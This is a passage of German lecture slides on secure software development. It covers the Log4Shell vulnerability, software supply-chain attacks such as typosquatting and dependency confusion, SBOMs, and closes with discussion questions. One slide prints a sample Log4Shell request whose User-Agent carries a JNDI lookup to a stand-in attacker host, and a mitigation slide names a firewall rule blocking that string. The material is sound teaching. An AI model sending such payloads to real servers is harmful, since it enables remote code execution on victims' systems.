2.  **Gefährlicher Lookup:** `jndi` (Java Naming and Directory Interface).

JNDI ermöglicht es Java-Apps, Objekte über Protokolle wie **LDAP** oder **RMI** zu finden.

---

# Der Angriffsvektor (Schritt für Schritt)

![w:680 center](img/log4shell_chain.svg)

---

## Warum war das so verheerend?

| Faktor | Auswirkung |
| :--- | :--- |
| **Einfachheit** | Keine komplexen Exploits nötig. Ein einfacher String reicht. |
| **Reichweite** | Von iCloud über Minecraft-Server bis hin zu internen Bankensystemen. |
| **Blind Spots** | Viele Firmen wussten gar nicht, dass sie Log4j (indirekt) nutzen. |
| **Nachgelagerte Systeme** | Ein Log-Eintrag kann durch viele Systeme wandern, bevor er "explodiert". |

---

## Code-Beispiel: Der "Magic String"

Ein typischer HTTP-Request, der die Lücke ausnutzt:

```http
GET / HTTP/1.1
Host: opfer-server.de
User-Agent: ${jndi:ldap://angreifer.com/a}

```

Wenn der Server den `User-Agent` einfach nur mit `logger.info()` protokolliert, wird die Kette ausgelöst.

---

## Die Lösung: Mitigation & Patches

1. **Update auf Version 2.17.1 (oder neuer):**
    * JNDI-Lookups wurden standardmäßig deaktiviert.
    * Unterstützung für LDAP-Remotecodes wurde entfernt.

2. **Konfiguration (Quick Fix):**
    * Setzen von `log4j2.formatMsgNoLookups=true`.

3. **WAF (Web Application Firewall):**
    * Blockieren von Requests, die `${jndi:` enthalten.

---
<!-- _class: chapter -->
# Supply Chain Angriffe
## Und die Rolle der Software Bill of Materials (SBOM)

---

# Was ist die Software Supply Chain?

Moderne Software wird nicht mehr "auf der grünen Wiese" geschrieben. Sie ist ein Produkt aus:

- **Proprietärem Code:** Eigenentwicklungen.
- **Open Source Komponenten:** Bibliotheken (npm, PyPI, Maven).
- **Build-Infrastruktur:** CI/CD-Pipelines, Compiler, Build-Server.
- **Drittanbieter-Tools:** Cloud-Dienste, IDE-Plugins.

> **Problem:** Ein Angreifer muss nicht Ihr Hauptquartier hacken, wenn er eine Bibliothek infizieren kann, die Sie (und tausende andere) blind vertrauen.

---

# Angriffsflächen in der Supply Chain

![w:700 center](img/supply_chain_attack_surface.svg)

---

# Typische Angriffsvektoren

- **Dependency Confusion:** Einschleusen von bösartigen Paketen mit gleichem Namen in öffentliche Repositories.
- **Typosquatting:** Erstellen von Paketen wie `requesst` statt `requests`.
- **Compromised Build Tools:** Manipulation des Build-Servers (z. B. Jenkins), um Backdoors während der Kompilierung einzufügen.
- **Account Takeover:** Übernahme von Maintainer-Accounts auf GitHub oder npm.

---

#  Die Lösung: Software Bill of Materials (SBOM)

Eine **SBOM** ist eine formale, strukturierte Liste aller Komponenten, Bibliotheken und Module, die in einer Software verwendet werden.

- **Wie eine Zutatenliste:** Vergleichbar mit den Inhaltsstoffen auf einer Lebensmittelverpackung.
- **Transparenz:** Ermöglicht die schnelle Identifizierung von "giftigen" Bestandteilen (Schwachstellen).
- **Vorgabe:** In vielen Sektoren (z. B. US-Behörden, kritische Infrastruktur) mittlerweile gesetzlich verpflichtend.

---

#  Anatomie einer SBOM

Eine effektive SBOM sollte folgende Fragen beantworten:

- **Wer** hat die Komponente erstellt? (Author)
- **Welche** Version wird genutzt? (Version)
- **Woher** stammt sie? (Download URL / Repository)
- **Abhängigkeiten:** Welche anderen Bibliotheken bringt diese Komponente mit? (Transitive Dependencies)
- **Lizenz:** Unter welcher Lizenz steht der Code? (Compliance)

---

#  Der SBOM-Lebenszyklus

![w:600 center](img/sbom_lifecycle.svg)

---

#  SBOM: Fazit & Best Practices

- **Vertraue nichts blind:** Jede `import`-Anweisung ist ein potenzielles Risiko.
- **Automatisierung:** SBOMs müssen Teil der CI/CD-Pipeline sein (Security as Code).
- **Vulnerability Scanning:** Tools wie *Trivy* oder *Snyk* nutzen SBOMs für präzise Scans.
- **Lieferanten fordern:** Akzeptieren Sie keine Software von Drittanbietern ohne begleitende SBOM.

---
<!-- _class: chapter -->

# Zusammenfassung & Diskussion

---

# Zusammenfassung

- **SSDLC vs. SDLC:** Sicherheit ist kein Anhang, sondern integraler Kern.
- **Shift Left:** Je früher ein Fehler gefunden wird, desto günstiger ist er.
- **Planung:** Security Requirements, Abuse Cases, Compliance von Anfang an.
- **Design:** Threat Modeling mit STRIDE ist das Standard-Vorgehen für Architekten.
- **Implementierung:** OWASP Top 10 kennen – Injection, XSS, Broken Access Control.
- **Testing:** SAST (Code), DAST (Laufzeit), SCA (Abhängigkeiten) – automatisiert in der Pipeline.
- **Deployment:** Container-Hardening, IaC-Scanning, Secrets Management.
- **Supply Chain:** Log4Shell zeigt – eine transitive Abhängigkeit kann alles kompromittieren.
- **Governance:** OWASP SAMM, NIST SSDF, Microsoft SDL – Frameworks zur Reifegradmessung.
- **Kultur:** Sicherheit ist die gemeinsame Verantwortung aller Beteiligten (DevSecOps).

---

# Diskussionsfragen

1. **Realität vs. Theorie:** In Ihrem Unternehmen wird ein kritisches Feature am Freitag um 17 Uhr fertig. Der SAST-Scan zeigt 3 "Medium"-Findings. Der Projektleiter sagt: "Wir shippen trotzdem." – Was tun Sie?

2. **Verantwortung:** Ein Open-Source-Maintainer pflegt eine Library, die in tausenden Produkten steckt – unbezahlt, in seiner Freizeit. Ein Bug in seiner Library verursacht Millionenschäden. Wer trägt die Verantwortung?

3. **KI & SSDLC:** Wie verändert KI-generierter Code (GitHub Copilot, ChatGPT) den SSDLC? Brauchen wir neue Phasen oder Tools?

4. **Trade-Off:** "100% Sicherheit ist unerreichbar." – Wie bestimmen Sie, wann ein Produkt "sicher genug" ist?

---

<style scoped>
h1 { font-size: 60pt; }
h2 { font-size: 40pt; }
</style>

# Und nächstes Mal..

## Netzwerksicherheit
